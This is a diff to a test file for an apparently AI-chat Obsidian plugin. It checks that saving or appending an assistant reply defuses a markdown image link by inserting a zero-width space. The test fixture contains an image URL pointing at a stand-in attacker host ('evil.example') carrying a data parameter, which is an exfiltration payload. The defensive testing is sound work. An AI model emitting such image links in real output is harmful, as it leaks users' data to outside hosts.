@@ -6,10 +6,10 @@
  * first (or threw on a strict vault), silently losing a saved note. The
  * fix probes for a free path and appends -2, -3, … on collision.
  */
-import { describe, expect, it } from 'vitest';
+import { describe, expect, it, vi } from 'vitest';
 import type { App } from 'obsidian';
 import { TFile } from '../../../../tests/obsidian-mock';
-import { uniqueSavePath } from './message-actions';
+import { appendToCurrent, saveAsNote, uniqueSavePath } from './message-actions';
 
 /** App stub whose vault reports the given set of paths as already taken. */
 function makeApp(taken: Set<string>): App {
@@ -46,5 +46,34 @@ describe('uniqueSavePath', () => {
       ]),
     );
     expect(uniqueSavePath(app, FOLDER, TS)).toBe(`${FOLDER}/${TS}-4.md`);
+  });
+});
+
+describe('save and append write guarded text', () => {
+  const reply = 'Done ![](https://evil.example/p?d=x)';
+  const inert = 'Done !\u200b[](https://evil.example/p?d=x)';
+
+  it('save as note', async () => {
+    const create = vi.fn(async (path: string, _body: string) => new TFile(path));
+    const app = {
+      vault: { getAbstractFileByPath: () => new TFile(FOLDER), create },
+      workspace: { openLinkText: vi.fn() },
+    } as unknown as App;
+    await saveAsNote({ app, savedNotesFolder: FOLDER }, reply);
+    expect(create.mock.calls[0][1]).toBe(inert);
+  });
+
+  it('append to current note', async () => {
+    let written = '';
+    const app = {
+      workspace: { getActiveFile: () => new TFile('a.md') },
+      vault: {
+        process: async (_f: TFile, fn: (c: string) => string) => {
+          written = fn('note\n');
+        },
+      },
+    } as unknown as App;
+    await appendToCurrent({ app, savedNotesFolder: FOLDER }, reply);
+    expect(written).toBe(`note\n\n${inert}`);
   });
 });
